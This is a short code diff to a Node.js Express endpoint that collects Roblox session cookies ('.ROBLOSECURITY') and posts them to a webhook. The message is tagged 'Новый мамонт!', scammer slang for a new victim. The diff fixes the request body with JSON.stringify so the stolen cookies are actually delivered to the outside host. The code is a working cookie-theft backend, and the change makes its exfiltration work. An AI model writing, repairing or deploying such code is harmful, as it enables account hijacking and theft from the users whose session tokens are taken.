@@ -23,10 +23,11 @@ app.post('/send', async (req, res) => {
         let newObject = {"name": `Куки №${index}`,"value":`${cookie}`};
         cookiesArray.push(newObject);
     }
+    let finalTextalmost = {"content":"Новый мамонт!","embeds":[{"title":"Данные","description":"Файлы .ROBLOSECURITY","color":5814783,"fields":[cookiesArray.concat(", ")]}],"attachments":[]};
     const response = await fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: {"content":"Новый мамонт!","embeds":[{"title":"Данные","description":"Файлы .ROBLOSECURITY","color":5814783,"fields":[cookiesArray.concat(", ")]}],"attachments":[]},
+      body: JSON.stringify(finalTextalmost)
     });
 });
 
